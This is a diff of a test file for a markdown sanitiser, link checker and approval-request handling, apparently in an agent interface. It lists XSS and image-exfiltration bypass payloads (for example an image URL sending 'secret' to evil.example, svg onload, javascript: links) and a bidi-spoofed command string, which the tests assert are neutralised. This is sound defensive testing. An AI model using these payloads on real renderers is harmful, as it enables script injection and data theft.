@@ -301,18 +301,120 @@ def test_fake_status_views(tmp_path):
     assert seen == {"connected": "connected", "disconnected": "disconnected", "disabled": "disabled", "unsandboxed": "degraded-isolation", "incompatible": "degraded"}
 
 
-def test_markdown_images_and_raw_html_are_neutralised_and_links_restricted():
-    out = run_js(r"""
-      console.log(JSON.stringify({
-        img: safeMarkdown('hi ![x](https://evil.example/?d=secret) there'),
-        ref: safeMarkdown('![pic][1]'),
-        html: safeMarkdown('a <img src="http://e/x.png"> b <script>x</script>'),
-        keep: safeMarkdown('**bold** [docs](https://example.org)'),
-        links: [isSafeLink('https://example.org/x'), isSafeLink('http://a.b'), isSafeLink('file:///etc/passwd'), isSafeLink('javascript:alert(1)'), isSafeLink('/rel'), isSafeLink('')]
-      }));
+BYPASS_INPUTS = [
+    "![a](http://evil.example/?d=secret)",
+    "![a][r]\n\n[r]: http://evil.example/x.png",
+    "<img src=http://evil.example/x.png>",
+    "<IMG SRC=http://evil.example/x.png>",
+    "< img src=x>",
+    "<<img src=x>>",
+    "\\<img src=x>",
+    "\\![a](http://evil.example/x)",
+    "!\\[a](http://evil.example/x)",
+    "<img\nsrc=http://evil.example/x>",
+    "<svg onload=alert(1)>",
+    "<a href='javascript:alert(1)'>x</a>",
+    "<iframe src=http://evil.example></iframe>",
+    "<![CDATA[ x ]]>",
+    "<!-- c --><img src=x>",
+    "&lt;img src=x&gt;",
+    "![a](<http://evil.example/x y>)",
+    "text ![](data:image/png;base64,AAAA) more",
+    "<http://evil.example/autolink>",
+    "[r]: http://evil.example/x.png",
+    "  [r]: http://evil.example/x.png",
+]
+
+
+def test_markdown_bypass_inputs_never_leave_html_or_image_syntax():
+    out = run_js("const I=%s; console.log(JSON.stringify(I.map(safeMarkdown)));" % json.dumps(BYPASS_INPUTS))
+    for src, res in zip(BYPASS_INPUTS, out):
+        assert "<" not in res, (src, res)
+        assert "![" not in res, (src, res)
+        assert not res.lstrip().startswith("[r]:"), (src, res)
+
+
+def test_markdown_fuzz_never_produces_markup_that_can_load():
+    alphabet = ["<", ">", "!", "[", "]", "(", ")", "&", "\\", "\n", " ", "img", "src=", "http://e/x", "r", ":", "#", "`"]
+    out = run_js("""
+      const A=%s;
+      let seed=12345; const rnd=()=> (seed=(seed*1103515245+12345)&0x7fffffff)/0x7fffffff;
+      let bad=0;
+      for (let i=0;i<4000;i++){ let t=''; const n=1+Math.floor(rnd()*40); for(let j=0;j<n;j++) t+=A[Math.floor(rnd()*A.length)];
+        const r=safeMarkdown(t); if (r.indexOf('<')!==-1 || r.indexOf('![')!==-1) bad++; }
+      console.log(JSON.stringify({bad}));
+    """ % json.dumps(alphabet))
+    assert out == {"bad": 0}
+
+
+def test_markdown_is_linear_and_capped():
+    out = run_js("""
+      const big = '![['.repeat(60000) + '<'.repeat(60000) + '['.repeat(200000);
+      const t0 = Date.now(); const r = safeMarkdown(big); const dt = Date.now()-t0;
+      const t1 = Date.now(); for (let i=0;i<50;i++) safeMarkdown('a ![x](u) <b> '.repeat(1000)); const dt2 = Date.now()-t1;
+      console.log(JSON.stringify({dt, dt2, len: r.length, ok: markdownOk(big), small: markdownOk('x')}));
     """)
-    assert "evil.example" not in out["img"] and "image omitted: x" in out["img"]
-    assert "image omitted" in out["ref"]
-    assert "<img" not in out["html"] and "<script" not in out["html"]
-    assert out["keep"] == "**bold** [docs](https://example.org)"
-    assert out["links"] == [True, True, False, False, False, False]
+    assert out["dt"] < 500 and out["dt2"] < 2000
+    assert out["len"] <= 20000 and out["ok"] is False and out["small"] is True
+
+
+def test_links_open_only_as_web_pages():
+    out = run_js("console.log(JSON.stringify([isSafeLink('https://example.org/x'), isSafeLink('http://a.b'), isSafeLink('file:///etc/passwd'), isSafeLink('javascript:alert(1)'), isSafeLink('/rel'), isSafeLink('')]));")
+    assert out == [True, True, False, False, False, False]
+
+
+def test_run_ids_and_request_refs_are_strict_and_bad_run_frames_ignored():
+    out = run_js("""
+      const ids=['run_1','a.b-c','', '.', '..','a/b','a b','a?x=1','x'.repeat(65),'é'];
+      const refs=['p1','p1@12','p1@','p1@x','a/b@1','p1@1234567890123'];
+      let s=initial(); let r=reduce(s,{type:'begin'}); s=r.state;
+      r=reduce(s,{type:'line',seq:s.seq,line:JSON.stringify({type:'run',text:'../../x'})}); s=r.state;
+      console.log(JSON.stringify({ids:ids.map(isValidRunId), refs:refs.map(isValidRequestRef), run:s.runId}));
+    """)
+    assert out["ids"] == [True, True, False, False, False, False, False, False, False, False]
+    assert out["refs"] == [True, True, False, False, False, False]
+    assert out["run"] == ""
+
+
+def test_approval_binds_request_id_mode_and_full_text():
+    lines = [j(type="run", text="r1"), j(type="mode", text="agent"), j(type="approval.control", text="p9@2"), j(type="approval", text="rm -r ./x")]
+    st = replay(lines, exit=False)["state"]
+    p = st["pending"]
+    assert p["requestId"] == "p9@2" and p["mode"] == "agent" and p["detail"] == "rm -r ./x"
+    assert p["truncated"] is False and p["flagged"] is False
+
+
+def test_replaced_request_never_merges_and_resets_decision_state():
+    out = run_js("""
+      let s=initial(); let r=reduce(s,{type:'begin'}); s=r.state; const q=s.seq;
+      const L=o=>{ r=reduce(s,{type:'line',seq:q,line:JSON.stringify(o)}); s=r.state; };
+      L({type:'run',text:'r1'}); L({type:'mode',text:'agent'});
+      L({type:'approval.control',text:'p1@1'}); L({type:'approval',text:'first'});
+      r=reduce(s,{type:'decision',ok:false,message:'boom'}); s=r.state;
+      const err=s.pending.error;
+      L({type:'approval.control',text:'p2@1'}); L({type:'approval',text:'second'});
+      console.log(JSON.stringify({err, id:s.pending.requestId, detail:s.pending.detail, e2:s.pending.error, dec:s.pending.deciding}));
+    """)
+    assert out == {"err": "boom", "id": "p2@1", "detail": "second", "e2": "", "dec": False}
+
+
+def test_missing_control_leaves_request_unbound_and_unknown_mode_is_flagged():
+    st = replay([j(type="run", text="r1"), j(type="mode", text="weird"), j(type="approval", text="x")], exit=False)["state"]
+    assert st["pending"]["requestId"] == "" and st["pending"]["mode"] == "unknown"
+
+
+def test_final_payload_carries_request_and_run_mode():
+    out = replay([final(False, "waiting", runId="r2", pending="approval", detail="gateway text", request="p5@3", mode="agent", choices="once,deny")])
+    p = out["state"]["pending"]
+    assert p["requestId"] == "p5@3" and p["mode"] == "agent" and p["detail"] == "gateway text"
+
+
+def test_long_request_is_flagged_truncated_not_silently_cut_and_hidden_chars_are_visible():
+    big = "A" * 9000
+    st = replay([j(type="run", text="r"), j(type="approval", text=big)], exit=False)["state"]
+    assert st["pending"]["truncated"] is True and len(st["pending"]["detail"]) <= 8000
+    st = replay([j(type="run", text="r"), j(type="approval", text="ls \u202e gnp.exe\u0007\u200b")], exit=False)["state"]
+    d = st["pending"]["detail"]
+    assert st["pending"]["flagged"] is True
+    assert "\u202e" not in d and "\u0007" not in d and "\u200b" not in d
+    assert "U+202E" in d and "U+0007" in d and "U+200B" in d
